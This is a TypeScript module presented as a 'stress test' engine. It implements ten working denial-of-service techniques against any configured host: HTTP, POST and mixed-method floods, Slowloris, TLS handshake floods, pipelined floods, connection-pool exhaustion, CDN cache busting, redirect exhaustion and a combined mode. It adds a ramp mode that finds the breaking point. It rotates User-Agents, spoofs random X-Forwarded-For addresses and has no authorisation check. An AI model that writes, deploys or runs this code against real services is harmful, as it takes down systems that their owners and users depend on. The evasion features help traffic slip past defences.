import * as http from "http";
import * as https from "https";
import * as net from "net";
import * as tls from "tls";
import { randomBytes } from "crypto";

export interface StressConfig {
  target: string;
  port: number;
  path: string;
  technique: string;
  concurrency: number;
  duration: number;
  useHttps: boolean;
  rampMode?: boolean;
  rampStartConcurrency?: number;
  rampStepPct?: number;
  rampStepSecs?: number;
}

export interface LatencyBucket {
  p50: number;
  p75: number;
  p95: number;
  p99: number;
  min: number;
  max: number;
}

export interface RampSnapshot {
  concurrency: number;
  rps: number;
  avgLatencyMs: number;
  errorRatePct: number;
  elapsedSecs: number;
}

export interface ResilienceReport {
  maxSustainableRps: number;
  breakingPointRps: number;
  breakingPointConcurrency: number;
  breakingPointErrorRate: number;
  p95AtBreaking: number;
  snapshots: RampSnapshot[];
}

export interface StressMetrics {
  requestsSent: number;
  requestsSuccess: number;
  requestsFailed: number;
  bytesOut: number;
  bytesIn: number;
  errorsConnRefused: number;
  errorsTimeout: number;
  errorsReset: number;
  errorsOther: number;
  statusCodes: Record<string, number>;
  latencySum: number;
  latencyCount: number;
  latencySamples: number[];
  latencyBucket: LatencyBucket;
  tlsHandshakes: number;
  connectionsOpen: number;
  peakRps: number;
  rpsWindow: number[];
  windowStart: number;
  windowCount: number;
  currentConcurrency: number;
}

export interface StressJob {
  id: string;
  config: StressConfig;
  startTime: number;
  endTime: number;
  active: boolean;
  metrics: StressMetrics;
  intervals: NodeJS.Timeout[];
  sockets: (net.Socket | tls.TLSSocket)[];
  log: string[];
  rampSnapshots: RampSnapshot[];
  resilienceReport?: ResilienceReport;
}

const jobs = new Map<string, StressJob>();

function makeId() { return randomBytes(8).toString("hex"); }

const UA_LIST = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
  "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
  "curl/8.4.0", "python-requests/2.31.0", "Go-http-client/1.1",
];

const METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"];

function randUA() { return UA_LIST[Math.floor(Math.random() * UA_LIST.length)]; }
function randPath(base: string) { return base + "?_=" + randomBytes(6).toString("hex") + "&t=" + Date.now(); }
function randBody() { return randomBytes(Math.floor(Math.random() * 4096 + 512)); }

function calcLatencyBucket(samples: number[]): LatencyBucket {
  if (!samples.length) return { p50: 0, p75: 0, p95: 0, p99: 0, min: 0, max: 0 };
  const sorted = [...samples].sort((a, b) => a - b);
  const pct = (p: number) => sorted[Math.min(sorted.length - 1, Math.floor(sorted.length * p / 100))];
  return { p50: pct(50), p75: pct(75), p95: pct(95), p99: pct(99), min: sorted[0], max: sorted[sorted.length - 1] };
}

function initMetrics(concurrency = 0): StressMetrics {
  return {
    requestsSent: 0, requestsSuccess: 0, requestsFailed: 0,
    bytesOut: 0, bytesIn: 0,
    errorsConnRefused: 0, errorsTimeout: 0, errorsReset: 0, errorsOther: 0,
    statusCodes: {}, latencySum: 0, latencyCount: 0, latencySamples: [],
    latencyBucket: { p50: 0, p75: 0, p95: 0, p99: 0, min: 0, max: 0 },
    tlsHandshakes: 0, connectionsOpen: 0,
    peakRps: 0, rpsWindow: [], windowStart: Date.now(), windowCount: 0,
    currentConcurrency: concurrency,
  };
}

function recordLatency(m: StressMetrics, startMs: number) {
  const lat = Date.now() - startMs;
  m.latencySum += lat;
  m.latencyCount++;
  if (m.latencySamples.length < 2000) m.latencySamples.push(lat);
}

function trackRps(m: StressMetrics) {
  m.windowCount++;
  const now = Date.now();
  if (now - m.windowStart >= 1000) {
    m.rpsWindow.push(m.windowCount);
    if (m.rpsWindow.length > 30) m.rpsWindow.shift();
    const cur = m.windowCount;
    if (cur > m.peakRps) m.peakRps = cur;
    m.windowCount = 0;
    m.windowStart = now;
  }
}

function recordStatus(m: StressMetrics, code: number) {
  const k = String(code);
  m.statusCodes[k] = (m.statusCodes[k] || 0) + 1;
}

function recordError(m: StressMetrics, err: Error | string) {
  const msg = typeof err === "string" ? err : err.message;
  if (msg.includes("ECONNREFUSED")) m.errorsConnRefused++;
  else if (msg.includes("ETIMEDOUT") || msg.includes("timeout")) m.errorsTimeout++;
  else if (msg.includes("ECONNRESET") || msg.includes("reset")) m.errorsReset++;
  else m.errorsOther++;
  m.requestsFailed++;
}

// ─── TECHNIQUE: HTTP Flood (concurrent GET storm) ──────────────────────────
function runHttpFlood(job: StressJob) {
  const { config, metrics } = job;
  const mod = config.useHttps ? https : http;

  const fire = () => {
    if (!job.active) return;
    const start = Date.now();
    const path = randPath(config.path);
    const headers: Record<string, string> = {
      "User-Agent": randUA(),
      "Accept": "text/html,application/json,*/*",
      "Accept-Encoding": "gzip, deflate, br",
      "Connection": "keep-alive",
      "Cache-Control": "no-cache",
    };
    const req = (mod as typeof https).request({
      hostname: config.target, port: config.port, path,
      method: "GET", headers, timeout: 8000, rejectUnauthorized: false,
    }, (res) => {
      let bytes = 0;
      res.on("data", (c: Buffer) => { bytes += c.length; });
      res.on("end", () => {
        metrics.requestsSuccess++;
        metrics.bytesIn += bytes;
        recordLatency(metrics, start);
        recordStatus(metrics, res.statusCode ?? 0);
        if (job.active) fire();
      });
    });
    req.on("timeout", () => { req.destroy(); recordError(metrics, "timeout"); if (job.active) fire(); });
    req.on("error", (e) => { recordError(metrics, e); if (job.active) fire(); });
    metrics.requestsSent++;
    trackRps(metrics);
    req.end();
  };

  for (let i = 0; i < config.concurrency; i++) {
    setTimeout(() => fire(), i * 5);
  }
}

// ─── TECHNIQUE: POST Body Flood ──────────────────────────────────────────────
function runPostFlood(job: StressJob) {
  const { config, metrics } = job;
  const mod = config.useHttps ? https : http;

  const fire = () => {
    if (!job.active) return;
    const body = randBody();
    const start = Date.now();
    const req = (mod as typeof https).request({
      hostname: config.target, port: config.port, path: config.path,
      method: "POST",
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Length": String(body.length),
        "User-Agent": randUA(),
        "Connection": "keep-alive",
      },
      timeout: 8000, rejectUnauthorized: false,
    }, (res) => {
      let bytes = 0;
      res.on("data", (c: Buffer) => { bytes += c.length; });
      res.on("end", () => {
        metrics.requestsSuccess++;
        metrics.bytesIn += bytes;
        recordLatency(metrics, start);
        recordStatus(metrics, res.statusCode ?? 0);
        if (job.active) fire();
      });
    });
    req.on("timeout", () => { req.destroy(); recordError(metrics, "timeout"); if (job.active) fire(); });
    req.on("error", (e) => { recordError(metrics, e); if (job.active) fire(); });
    req.write(body);
    metrics.requestsSent++;
    metrics.bytesOut += body.length;
    trackRps(metrics);
    req.end();
  };

  for (let i = 0; i < config.concurrency; i++) setTimeout(() => fire(), i * 5);
}

// ─── TECHNIQUE: Mixed-Method Flood ───────────────────────────────────────────
function runMixedFlood(job: StressJob) {
  const { config, metrics } = job;
  const mod = config.useHttps ? https : http;

  const fire = () => {
    if (!job.active) return;
    const method = METHODS[Math.floor(Math.random() * METHODS.length)];
    const hasBody = ["POST", "PUT", "PATCH"].includes(method);
    const body = hasBody ? randBody() : null;
    const start = Date.now();
    const req = (mod as typeof https).request({
      hostname: config.target, port: config.port,
      path: randPath(config.path), method,
      headers: {
        "User-Agent": randUA(),
        "Content-Type": hasBody ? "application/json" : undefined,
        "Content-Length": body ? String(body.length) : undefined,
        "Connection": "keep-alive",
        "X-Forwarded-For": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      } as any,
      timeout: 8000, rejectUnauthorized: false,
    }, (res) => {
      let bytes = 0;
      res.on("data", (c: Buffer) => { bytes += c.length; });
      res.on("end", () => {
        metrics.requestsSuccess++;
        metrics.bytesIn += bytes;
        recordLatency(metrics, start);
        recordStatus(metrics, res.statusCode ?? 0);
        if (job.active) fire();
      });
    });
    req.on("timeout", () => { req.destroy(); recordError(metrics, "timeout"); if (job.active) fire(); });
    req.on("error", (e) => { recordError(metrics, e); if (job.active) fire(); });
    if (body) { req.write(body); metrics.bytesOut += body.length; }
    metrics.requestsSent++;
    trackRps(metrics);
    req.end();
  };

  for (let i = 0; i < config.concurrency; i++) setTimeout(() => fire(), i * 5);
}

// ─── TECHNIQUE: Slowloris (keep connections open with trickle headers) ────────
function runSlowloris(job: StressJob) {
  const { config, metrics } = job;
  const numSockets = Math.min(config.concurrency * 10, 500);

  const openSocket = () => {
    if (!job.active) return;
    const socket: net.Socket = config.useHttps
      ? (tls.connect({ host: config.target, port: config.port, rejectUnauthorized: false }) as any)
      : net.createConnection({ host: config.target, port: config.port });

    job.sockets.push(socket);
    metrics.connectionsOpen++;

    socket.on("connect", () => {
      if (config.useHttps && !("authorized" in socket)) {
        (socket as any).once("secureConnect", () => { metrics.tlsHandshakes++; });
      }
      socket.write(`GET ${config.path} HTTP/1.1\r\nHost: ${config.target}\r\nUser-Agent: ${randUA()}\r\nAccept-Language: en-US,en;q=0.9\r\nContent-Length: 42000\r\n`);
      metrics.requestsSent++;
      trackRps(metrics);

      const trickle = setInterval(() => {
        if (!job.active || socket.destroyed) { clearInterval(trickle); return; }
        socket.write(`X-Slow-${randomBytes(4).toString("hex")}: ${randomBytes(8).toString("hex")}\r\n`);
        metrics.bytesOut += 40;
      }, 15000);
      job.intervals.push(trickle as any);
    });

    socket.on("data", (d: Buffer) => { metrics.bytesIn += d.length; metrics.requestsSuccess++; });
    socket.on("error", (e) => {
      recordError(metrics, e);
      metrics.connectionsOpen = Math.max(0, metrics.connectionsOpen - 1);
      const idx = job.sockets.indexOf(socket);
      if (idx !== -1) job.sockets.splice(idx, 1);
      if (job.active) setTimeout(openSocket, 500);
    });
    socket.on("close", () => {
      metrics.connectionsOpen = Math.max(0, metrics.connectionsOpen - 1);
      const idx = job.sockets.indexOf(socket);
      if (idx !== -1) job.sockets.splice(idx, 1);
      if (job.active) setTimeout(openSocket, 500);
    });
    socket.setTimeout(0);
  };

  for (let i = 0; i < numSockets; i++) setTimeout(openSocket, i * 10);
}

// ─── TECHNIQUE: TLS Handshake Flood ──────────────────────────────────────────
function runTlsFlood(job: StressJob) {
  const { config, metrics } = job;
  if (!config.useHttps && config.port !== 443) {
    job.log.push("TLS Flood requires HTTPS — switching to HTTP flood on this port");
    runHttpFlood(job);
    return;
  }

  const fire = () => {
    if (!job.active) return;
    const sock = tls.connect({
      host: config.target, port: config.port,
      rejectUnauthorized: false, timeout: 5000,
    });
    job.sockets.push(sock);
    sock.on("secureConnect", () => {
      metrics.tlsHandshakes++;
      metrics.requestsSent++;
      trackRps(metrics);
      sock.write(`GET ${randPath(config.path)} HTTP/1.1\r\nHost: ${config.target}\r\nUser-Agent: ${randUA()}\r\nConnection: close\r\n\r\n`);
      let bytes = 0;
      sock.on("data", (d: Buffer) => { bytes += d.length; });
      sock.on("end", () => {
        metrics.bytesIn += bytes;
        metrics.requestsSuccess++;
        const idx = job.sockets.indexOf(sock);
        if (idx !== -1) job.sockets.splice(idx, 1);
        if (job.active) fire();
      });
    });
    sock.on("timeout", () => { sock.destroy(); recordError(metrics, "timeout"); if (job.active) fire(); });
    sock.on("error", (e) => {
      recordError(metrics, e);
      const idx = job.sockets.indexOf(sock);
      if (idx !== -1) job.sockets.splice(idx, 1);
      if (job.active) fire();
    });
  };

  for (let i = 0; i < config.concurrency; i++) setTimeout(() => fire(), i * 10);
}

// ─── TECHNIQUE: Pipelined Request Flood ──────────────────────────────────────
function runPipelineFlood(job: StressJob) {
  const { config, metrics } = job;
  const PIPELINE_DEPTH = 32;

  const openPipeline = () => {
    if (!job.active) return;
    const sock: net.Socket | tls.TLSSocket = config.useHttps
      ? tls.connect({ host: config.target, port: config.port, rejectUnauthorized: false })
      : net.createConnection({ host: config.target, port: config.port });

    job.sockets.push(sock);

    const onConnect = () => {
      let pipeline = "";
      for (let i = 0; i < PIPELINE_DEPTH; i++) {
        pipeline += `GET ${randPath(config.path)} HTTP/1.1\r\nHost: ${config.target}\r\nUser-Agent: ${randUA()}\r\nConnection: keep-alive\r\n\r\n`;
      }
      sock.write(pipeline);
      metrics.requestsSent += PIPELINE_DEPTH;
      metrics.bytesOut += pipeline.length;
      for (let i = 0; i < PIPELINE_DEPTH; i++) trackRps(metrics);

      let bytes = 0;
      sock.on("data", (d: Buffer) => { bytes += d.length; metrics.bytesIn += d.length; });
      sock.on("end", () => {
        metrics.requestsSuccess += PIPELINE_DEPTH;
        metrics.latencyCount += PIPELINE_DEPTH;
        const idx = job.sockets.indexOf(sock);
        if (idx !== -1) job.sockets.splice(idx, 1);
        if (job.active) openPipeline();
      });
    };

    if (config.useHttps) {
      (sock as tls.TLSSocket).on("secureConnect", () => { metrics.tlsHandshakes++; onConnect(); });
    } else {
      sock.on("connect", onConnect);
    }
    sock.on("error", (e) => {
      recordError(metrics, e);
      const idx = job.sockets.indexOf(sock);
      if (idx !== -1) job.sockets.splice(idx, 1);
      if (job.active) setTimeout(openPipeline, 200);
    });
    sock.on("timeout", () => { sock.destroy(); recordError(metrics, "timeout"); if (job.active) setTimeout(openPipeline, 200); });
    sock.setTimeout(8000);
  };

  for (let i = 0; i < config.concurrency; i++) setTimeout(() => openPipeline(), i * 15);
}

// ─── TECHNIQUE: Connection Pool Exhaustion ─────────────────────────────────
function runConnExhaust(job: StressJob) {
  const { config, metrics } = job;

  const openAndHold = () => {
    if (!job.active) return;
    const sock: net.Socket | tls.TLSSocket = config.useHttps
      ? tls.connect({ host: config.target, port: config.port, rejectUnauthorized: false })
      : net.createConnection({ host: config.target, port: config.port });

    job.sockets.push(sock);
    metrics.connectionsOpen++;

    const onConnect = () => {
      if (config.useHttps) metrics.tlsHandshakes++;
      sock.write(`GET ${config.path} HTTP/1.1\r\nHost: ${config.target}\r\nUser-Agent: ${randUA()}\r\nConnection: keep-alive\r\n\r\n`);
      metrics.requestsSent++;
      trackRps(metrics);
    };

    if (config.useHttps) (sock as tls.TLSSocket).on("secureConnect", onConnect);
    else sock.on("connect", onConnect);

    sock.on("data", (d: Buffer) => { metrics.bytesIn += d.length; metrics.requestsSuccess++; });
    sock.on("close", () => {
      metrics.connectionsOpen = Math.max(0, metrics.connectionsOpen - 1);
      const idx = job.sockets.indexOf(sock);
      if (idx !== -1) job.sockets.splice(idx, 1);
      if (job.active) setTimeout(openAndHold, 100);
    });
    sock.on("error", (e) => {
      recordError(metrics, e);
      metrics.connectionsOpen = Math.max(0, metrics.connectionsOpen - 1);
      const idx = job.sockets.indexOf(sock);
      if (idx !== -1) job.sockets.splice(idx, 1);
      if (job.active) setTimeout(openAndHold, 200);
    });
    sock.setTimeout(0);
  };

  const target = config.concurrency * 20;
  for (let i = 0; i < target; i++) setTimeout(openAndHold, i * 5);
}

// ─── TECHNIQUE: Cache Buster (CDN bypass) ────────────────────────────────────
function runCacheBuster(job: StressJob) {
  const { config, metrics } = job;
  const mod = config.useHttps ? https : http;

  const fire = () => {
    if (!job.active) return;
    const qs = `?cachebust=${randomBytes(8).toString("hex")}&t=${Date.now()}&r=${Math.random()}`;
    const start = Date.now();
    const req = (mod as typeof https).request({
      hostname: config.target, port: config.port,
      path: config.path + qs, method: "GET",
      headers: {
        "User-Agent": randUA(),
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Expires": "0",
        "Connection": "keep-alive",
      },
      timeout: 8000, rejectUnauthorized: false,
    }, (res) => {
      let bytes = 0;
      res.on("data", (c: Buffer) => { bytes += c.length; });
      res.on("end", () => {
        metrics.requestsSuccess++;
        metrics.bytesIn += bytes;
        recordLatency(metrics, start);
        recordStatus(metrics, res.statusCode ?? 0);
        if (job.active) fire();
      });
    });
    req.on("timeout", () => { req.destroy(); recordError(metrics, "timeout"); if (job.active) fire(); });
    req.on("error", (e) => { recordError(metrics, e); if (job.active) fire(); });
    metrics.requestsSent++;
    trackRps(metrics);
    req.end();
  };

  for (let i = 0; i < config.concurrency; i++) setTimeout(() => fire(), i * 5);
}

// ─── TECHNIQUE: Redirect Exhaustion ──────────────────────────────────────────
function runRedirectExhaust(job: StressJob) {
  const { config, metrics } = job;
  const mod = config.useHttps ? https : http;

  const followRedirects = (url: string, depth: number) => {
    if (!job.active || depth > 20) return;
    const start = Date.now();
    const req = (mod as typeof https).request({
      hostname: config.target, port: config.port, path: url,
      method: "GET", headers: { "User-Agent": randUA(), "Connection": "keep-alive" },
      timeout: 8000, rejectUnauthorized: false,
    }, (res) => {
      let bytes = 0;
      res.on("data", (c: Buffer) => { bytes += c.length; });
      res.on("end", () => {
        metrics.requestsSuccess++;
        metrics.bytesIn += bytes;
        recordLatency(metrics, start);
        recordStatus(metrics, res.statusCode ?? 0);
        if ((res.statusCode ?? 0) >= 300 && (res.statusCode ?? 0) < 400 && res.headers.location) {
          followRedirects(res.headers.location as string, depth + 1);
        } else if (job.active) {
          followRedirects(randPath(config.path), 0);
        }
      });
    });
    req.on("timeout", () => { req.destroy(); recordError(metrics, "timeout"); if (job.active) followRedirects(randPath(config.path), 0); });
    req.on("error", (e) => { recordError(metrics, e); if (job.active) setTimeout(() => followRedirects(randPath(config.path), 0), 200); });
    metrics.requestsSent++;
    trackRps(metrics);
    req.end();
  };

  for (let i = 0; i < config.concurrency; i++) setTimeout(() => followRedirects(randPath(config.path), 0), i * 10);
}

// ─── TECHNIQUE: All Combined ──────────────────────────────────────────────────
function runCombined(job: StressJob) {
  const half = Math.ceil(job.config.concurrency / 2);
  const quarter = Math.ceil(job.config.concurrency / 4);
  const sub = (c: number, fn: (j: StressJob) => void) => {
    const j2: StressJob = { ...job, config: { ...job.config, concurrency: c } };
    j2.sockets = job.sockets;
    j2.intervals = job.intervals;
    fn(j2);
  };
  sub(half, runHttpFlood);
  sub(quarter, runSlowloris);
  sub(quarter, job.config.useHttps ? runTlsFlood : runPipelineFlood);
}

function buildResilienceReport(snapshots: RampSnapshot[]): ResilienceReport {
  if (!snapshots.length) return { maxSustainableRps: 0, breakingPointRps: 0, breakingPointConcurrency: 0, breakingPointErrorRate: 0, p95AtBreaking: 0, snapshots: [] };
  const BREAK_THRESHOLD = 20; // error rate % that defines breaking point
  const breaking = snapshots.find((s) => s.errorRatePct >= BREAK_THRESHOLD);
  const lastGood = breaking ? snapshots[snapshots.indexOf(breaking) - 1] : snapshots[snapshots.length - 1];
  const maxRps = Math.max(...snapshots.map((s) => s.rps));
  return {
    maxSustainableRps: lastGood?.rps ?? maxRps,
    breakingPointRps: breaking?.rps ?? 0,
    breakingPointConcurrency: breaking?.concurrency ?? 0,
    breakingPointErrorRate: breaking?.errorRatePct ?? 0,
    p95AtBreaking: breaking?.avgLatencyMs ?? 0,
    snapshots,
  };
}

export function startStressTest(config: StressConfig): StressJob {
  const id = makeId();
  const now = Date.now();
  const startConcurrency = config.rampMode ? (config.rampStartConcurrency ?? 2) : config.concurrency;
  const job: StressJob = {
    id, config: { ...config, concurrency: startConcurrency },
    startTime: now,
    endTime: now + config.duration * 1000,
    active: true,
    metrics: initMetrics(startConcurrency),
    intervals: [], sockets: [], log: [],
    rampSnapshots: [],
  };
  jobs.set(id, job);

  const RUNNERS: Record<string, (j: StressJob) => void> = {
    "http-flood": runHttpFlood,
    "post-flood": runPostFlood,
    "mixed-flood": runMixedFlood,
    "slowloris": runSlowloris,
    "tls-flood": runTlsFlood,
    "pipeline-flood": runPipelineFlood,
    "conn-exhaust": runConnExhaust,
    "cache-buster": runCacheBuster,
    "redirect-exhaust": runRedirectExhaust,
    "combined": runCombined,
  };

  const runner = RUNNERS[config.technique] ?? runHttpFlood;
  runner(job);

  // ─── Ramp Mode — increases concurrency every N seconds ──────────────────
  if (config.rampMode) {
    const stepSecs = Math.max(5, config.rampStepSecs ?? 10);
    const stepPct = Math.max(10, config.rampStepPct ?? 25);
    const maxConcurrency = config.concurrency;

    const rampTick = setInterval(() => {
      if (!job.active) { clearInterval(rampTick); return; }
      const elapsed = Math.floor((Date.now() - job.startTime) / 1000);
      const m = job.metrics;
      const errorRate = m.requestsSent > 0 ? (m.requestsFailed / m.requestsSent) * 100 : 0;
      const avgLat = m.latencyCount > 0 ? Math.round(m.latencySum / m.latencyCount) : 0;
      const curRps = m.rpsWindow.length > 0 ? m.rpsWindow[m.rpsWindow.length - 1] : 0;

      // Take snapshot
      job.rampSnapshots.push({
        concurrency: job.config.concurrency,
        rps: curRps,
        avgLatencyMs: avgLat,
        errorRatePct: Math.round(errorRate * 10) / 10,
        elapsedSecs: elapsed,
      });

      // Ramp up unless at max
      if (job.config.concurrency < maxConcurrency) {
        const next = Math.min(maxConcurrency, Math.ceil(job.config.concurrency * (1 + stepPct / 100)));
        const added = next - job.config.concurrency;
        job.config.concurrency = next;
        job.metrics.currentConcurrency = next;
        // Spawn additional workers for the new concurrency
        const subJob = { ...job, config: { ...job.config, concurrency: added } };
        runner(subJob as StressJob);
        job.log.push(`[RAMP] Concurrency → ${next} (added ${added} workers) | cur RPS: ${curRps} | error rate: ${errorRate.toFixed(1)}%`);
      }
    }, stepSecs * 1000);
    job.intervals.push(rampTick);
  }

  // ─── Periodic latency bucket update ─────────────────────────────────────
  const bucketTick = setInterval(() => {
    if (!job.active) { clearInterval(bucketTick); return; }
    if (job.metrics.latencySamples.length > 0) {
      job.metrics.latencyBucket = calcLatencyBucket(job.metrics.latencySamples);
    }
  }, 2000);
  job.intervals.push(bucketTick);

  const stopTimer = setTimeout(() => {
    if (job.rampSnapshots.length > 0) {
      job.resilienceReport = buildResilienceReport(job.rampSnapshots);
    } else if (job.metrics.latencySamples.length > 0) {
      job.metrics.latencyBucket = calcLatencyBucket(job.metrics.latencySamples);
    }
    stopStressTest(id);
  }, config.duration * 1000 + 200);
  job.intervals.push(stopTimer as unknown as NodeJS.Timeout);

  return job;
}

export function getStressJob(id: string): StressJob | undefined {
  return jobs.get(id);
}

export function stopStressTest(id: string): boolean {
  const job = jobs.get(id);
  if (!job) return false;
  job.active = false;
  job.intervals.forEach((t) => { try { clearTimeout(t); clearInterval(t); } catch {} });
  job.sockets.forEach((s) => { try { s.destroy(); } catch {} });
  jobs.delete(id);
  return true;
}
